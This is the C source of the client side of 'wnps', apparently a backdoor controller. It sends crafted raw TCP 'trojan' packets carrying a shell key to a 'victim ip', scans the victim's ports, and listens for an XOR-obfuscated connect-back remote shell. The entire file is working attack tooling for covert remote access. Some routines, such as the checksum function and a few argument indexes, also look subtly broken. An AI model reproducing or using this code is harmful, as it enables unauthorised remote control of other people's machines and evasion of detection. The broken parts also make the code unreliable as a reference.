/*
        wnps client side V 1.0

        by wzt  <wzt@xsec.org>
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <errno.h>
#include "config.h"
#include "socket.h"
#include "send.h"

#define ECHAR            0x1d
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414

#define BUF                16384
#define BUF_SIZE        4096
#define    ENVLEN            256

int winsize;

/* function in interface.c */
extern void find_interface();

char local_ip[20];

unsigned char xorkeys[5] = { 'x', 's', 'e', 'c', 0 };

void
usage(char *pro)
{
	fprintf(stdout, "wnps client side v %2.1f\n\n", VER);
	fprintf(stdout, "usage : %s <options>\n\n", pro);
	fprintf(stdout, "<options>:\n");
	fprintf(stdout,
		"-tcp|-packet <victim ip> [victim port] [connect back ip] [connect back port]\n");
	fprintf(stdout, "-listen <port>\n");
	exit(0);
}

void
encrypt_code(char *buf, int count)
{
	char *p;
	int i, j;

	for (i = 0; i < 4; i++)
		for (p = buf, j = 0; j < count; j++, p++)
			*p ^= xorkeys[i];
}

unsigned short
in_cksum(unsigned short *addr, int len)
{
	register int sum = 0;
	register u_short *w = addr;
	register int nleft = len;
	u_short value = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *) (&value) = *(u_char *) w;
		sum += value;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return value;
}

int
tcpsend(char *src_ip, char *dst_ip, int src_port, int dst_port, char *data,
	int data_len)
{
	struct iphdr ip;
	struct tcphdr tcp;
	struct psehdr pseuhdr;
	struct trojan_packet trojan;
	struct sockaddr_in remote;
	char data_buf[MAXSIZE];
	int sock_id;
	int flag = 1;
	int s_len;

	if ((sock_id = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < -1) {
		perror("[-] socket");
		exit(1);
	}

	if (setsockopt
	    (sock_id, IPPROTO_IP, IP_HDRINCL, (char *) &flag,
	     sizeof (flag)) < 0) {
		perror("[-] setsockopt");
		exit(1);
	}

	trojan.trojan_id = htons(TROJAN_ID);
	strcpy(trojan.data, data);
	trojan.datalen = data_len;

	ip.h_verlen = (4 << 4 | sizeof (struct iphdr) / sizeof (unsigned long));
	ip.tos = 0;
	ip.total_len = htons(PACKLEN);
	ip.frag_and_flags = 0x40;
	ip.ident = 13;
	ip.ttl = 255;
	ip.proto = IPPROTO_TCP;
	ip.sourceIP = inet_addr(src_ip);
	ip.destIP = inet_addr(dst_ip);
	ip.checksum = 0;

	tcp.th_sport = htons(src_port);
	tcp.th_dport = htons(dst_port);
	tcp.th_seq = htonl(SEQ);
	tcp.th_ack = htonl(0);
	tcp.th_lenres = (sizeof (struct tcphdr) / 4 << 4 | 0);
	tcp.th_flag = 2;
	tcp.th_win = htons(512);
	tcp.th_sum = 0;
	tcp.th_urp = 0;

	pseuhdr.saddr = ip.sourceIP;
	pseuhdr.daddr = ip.destIP;
	pseuhdr.reserved = 0;
	pseuhdr.proto = ip.proto;
	pseuhdr.len = htons(TCPLEN + TROJANLEN + data_len);

	memcpy(data_buf, &pseuhdr, PSELEN);
	memcpy(data_buf + PSELEN, &tcp, TCPLEN);
	memcpy(data_buf + PSELEN + TCPLEN, &trojan, TROJANLEN + data_len);

	tcp.th_sum =
	    in_cksum((unsigned short *) data_buf,
		     (PSELEN + TCPLEN + TROJANLEN + data_len));

	memcpy(data_buf, &ip, IPLEN);
	memcpy(data_buf + IPLEN, &tcp, TCPLEN);
	memcpy(data_buf + IPLEN + TCPLEN, &trojan, TROJANLEN + data_len);

	remote.sin_family = AF_INET;
	remote.sin_port = tcp.th_dport;
	remote.sin_addr.s_addr = ip.destIP;

	if ((s_len =
	     sendto(sock_id, data_buf, PACKLEN + data_len, 0,
		    (struct sockaddr *) &remote,
		    sizeof (struct sockaddr))) < 0) {
		perror("[-] sendto");
		exit(1);
	}

	printf("[+] Packet Successfuly Sending %d Size.\n", s_len);

	close(sock_id);
}

/*
void sendenv(int sock)
{
    struct    winsize    ws;
    char    envbuf[ENVLEN+1];
    char    buf1[256];
    char    buf2[256];
    int    i = 0;

    ioctl(0, TIOCGWINSZ, &ws);
    sprintf(buf1, "COLUMNS=%d", ws.ws_col);
    sprintf(buf2, "LINES=%d", ws.ws_row);
    envtab[0] = buf1; envtab[1] = buf2;

    while (envtab[i]) {
        bzero(envbuf, ENVLEN);
        if (envtab[i][0] == '!') {
            char *env;
            env = getenv(&envtab[i][1]);
            if (!env) goto oops;
            sprintf(envbuf, "%s=%s", &envtab[i][1], env);
        } else {
            strncpy(envbuf, envtab[i], ENVLEN);
        }
        write(sock, envbuf, ENVLEN);
    oops:
        i++;
    }
    write(sock, "\n\n\n", 3);
}
*/

void
winch(int i)
{
	signal(SIGWINCH, winch);
	winsize++;
}

void
getshell_local(int port)
{
	struct termios old, new;
	unsigned char buf[BUF],tmp_buf[20];
	fd_set fds;
	int eerrno;
	struct winsize ws;
	int sock,len;

	printf("[+] Getting shell on port %d\n", ntohs(port));
	sock = listen_port(port);

	if (sock < 0) {
		printf("[-] bind port failed.\n");
		close(sock);
		exit(1);
	}
	// sendenv(sock);

	write(1,banner,strlen(banner));

	/* set-up terminal */
	tcgetattr(0, &old);
	new = old;
	new.c_lflag &= ~(ICANON | ECHO | ISIG);
	new.c_iflag &= ~(IXON | IXOFF);
	tcsetattr(0, TCSAFLUSH, &new);

	winch(0);
	while (1) {
		FD_ZERO(&fds);
		FD_SET(0, &fds);
		FD_SET(sock, &fds);

		if (winsize) {
			if (ioctl(0, TIOCGWINSZ, &ws) == 0) {
				buf[0] = ECHAR;
				buf[1] = (ws.ws_col >> 8) & 0xFF;
				buf[2] = ws.ws_col & 0xFF;
				buf[3] = (ws.ws_row >> 8) & 0xFF;
				buf[4] = ws.ws_row & 0xFF;
#if ENCRYPT == 0
				encrypt_code(buf, 5);
#endif
				write(sock, buf, 5);
			}
			winsize = 0;
		}

		if (select(sock + 1, &fds, NULL, NULL, NULL) < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		if (winsize)
			continue;
		if (FD_ISSET(sock, &fds)) {
			int count = read(sock, buf, BUF);
			if (count <= 0)
				break;
#if ENCRYPT == 0
			encrypt_code(buf, count);
#endif
			if (write(0, buf, count) <= 0)
				break;
		}
		if (FD_ISSET(0, &fds)) {
			int count = read(0, buf, BUF);
			int i;
			if (count <= 0)
				break;
			if (memchr(buf, ECHAR, count))
				break;
#if ENCRYPT == 0
			encrypt_code(buf, count);
#endif
			if (write(sock, buf, count) <= 0)
				break;
		}
	}
	close(sock);
	tcsetattr(0, TCSAFLUSH, &old);
	printf("\nConnection closed.\n");

	exit(0);
}

int
scan_port(int ip, int flag)
{
	int i = 0;
	int sock_fd;

	for (; i < PORT_NUM; i++) {
		sock_fd = connect_ip(ip, htons(ports[i]));
		printf("[+] trying port %5d ...          ", ports[i]);
		if (sock_fd) {
			printf("ok.\n");
			if (flag == 1)
				return sock_fd;
			close(sock_fd);
			return ports[i];
		} else
			printf("failed.\n");
	}

	return 0;
}

int
main(int argc, char **argv)
{
	char send_buf[100], temp[50];
	int port;
	int sock;

	if (argc == 1)
		usage(argv[0]);

	if (!strcmp(argv[1], "-listen")) {
		if (argc == 2)
			getshell_local(htons(DEFAULT_PORT));
		else if (argc == 3)
			getshell_local(htons(atoi(argv[2])));
		return 0;
	}

	if (!strcmp(argv[1], "-tcp")) {
		if (argc == 3) {
			//getshell_local(htons(DEFAULT_PORT));
			find_interface();
			sock = scan_port(inet_addr(argv[2]), 1);
			sprintf(temp, "%s:%d", TCP_SHELL_KEY, DEFAULT_PORT);
			printf("%s\n", temp);
			write(sock, temp, strlen(temp));
			close(sock);
			getshell_local(htons(DEFAULT_PORT));
		}

		if (argc == 4) {
			if (atoi(argv[3]) > 0 && atoi(argv[3]) <= 65535
			    && strstr(argv[3], ".") == NULL) {
				find_interface();
				port = atoi(argv[3]);
				sock =
				    connect_ip(inet_addr(argv[2]), htons(port));
				sprintf(temp, "%s:%d", TCP_SHELL_KEY,
					DEFAULT_PORT);
				printf("%s\n", temp);
				write(sock, temp, strlen(temp));
				close(sock);
				getshell_local(htons(DEFAULT_PORT));
			} else {
				sock = scan_port(inet_addr(argv[2]), 1);
				sprintf(temp, "%s:%s:%d", TCP_SHELL_KEY,
					argv[3], DEFAULT_PORT);
				printf("%s\n", temp);
				write(sock, temp, strlen(temp));
				close(sock);
				return 0;
			}
		}

		if (argc == 5) {
			if (atoi(argv[3]) > 0 && atoi(argv[3]) <= 65535
			    && strstr(argv[3], ".") == NULL) {
				find_interface();
				port = atoi(argv[3]);
				sock =
				    connect_ip(inet_addr(argv[1]), htons(port));
				sprintf(temp, "%s:%s:%d", TCP_SHELL_KEY,
					argv[2], atoi(argv[4]));
				printf("%s\n", temp);
				write(sock, temp, strlen(temp));
				close(sock);
				getshell_local(htons(atoi(argv[4])));
			} else {
				sock = scan_port(inet_addr(argv[2]), 1);
				sprintf(temp, "%s:%s:%d", TCP_SHELL_KEY,
					argv[3], atoi(argv[4]));
				printf("%s\n", temp);
				write(sock, temp, strlen(temp));
				close(sock);
			}
		}

		if (argc == 6) {
			port = atoi(argv[3]);
			sock = connect_ip(inet_addr(argv[2]), htons(port));
			sprintf(temp, "%s:%d", argv[4], argv[5]);
			printf("%s\n", temp);
			write(sock, temp, strlen(temp));
			close(sock);
			return 0;
		}
	}

	if (!strcmp(argv[1], "-packet")) {
		if (argc == 3) {
			find_interface();
			port = scan_port(inet_addr(argv[2]), 0);
			tcpsend(local_ip, argv[2], DEFAULT_PORT, port,
				TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
			getshell_local(htons(DEFAULT_PORT));
		}

		if (argc == 4) {
			if (atoi(argv[3]) > 0 && atoi(argv[3]) <= 65535
			    && strstr(argv[3], ".") == NULL) {
				find_interface();
				port = atoi(argv[3]);
				tcpsend(local_ip, argv[2], DEFAULT_PORT, port,
					TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
				getshell_local(htons(DEFAULT_PORT));
			} else {
				port = scan_port(inet_addr(argv[2]), 0);
				tcpsend(argv[3], argv[2], DEFAULT_PORT, port,
					TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
			}
		}

		if (argc == 5) {
			if (atoi(argv[3]) > 0 && atoi(argv[3]) <= 65535
			    && strstr(argv[3], ".") == NULL) {
				find_interface();
				port = atoi(argv[3]);
				tcpsend(local_ip, argv[2], atoi(argv[4]), port,
					TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
				getshell_local(htons(atoi(argv[4])));
			} else {
				port = scan_port(inet_addr(argv[2]), 0);
				tcpsend(argv[3], argv[2], atoi(argv[4]), port,
					TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
			}
		}

		if (argc == 6) {
			tcpsend(argv[4], argv[2], atoi(argv[5]), atoi(argv[3]),
				TCP_SHELL_KEY, strlen(TCP_SHELL_KEY));
		}
	}

	return 0;
}
